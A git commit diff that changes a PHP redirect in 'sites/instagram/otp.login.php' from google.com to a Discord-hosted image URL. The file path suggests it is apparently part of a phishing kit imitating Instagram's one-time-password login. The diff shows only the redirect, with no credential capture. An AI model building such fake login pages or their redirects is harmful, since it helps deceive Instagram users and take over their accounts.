4b1722b75036733a789872b0ef6cce490bc5f377
Fran0987 <70840620+Fran0987@users.noreply.github.com>
2020-09-06 20:37:28 -0300

    Update otp.login.php

--- sites/instagram/otp.login.php
+++ sites/instagram/otp.login.php
@@ -1,4 +1,4 @@
 <?php
 
-header('Location: https://www.google.com');
+header('Location: https://cdn.discordapp.com/attachments/748753299112722432/752307344968515694/5c3b5fdbf8339e233677cdd594ab2801.jpg');
 exit();
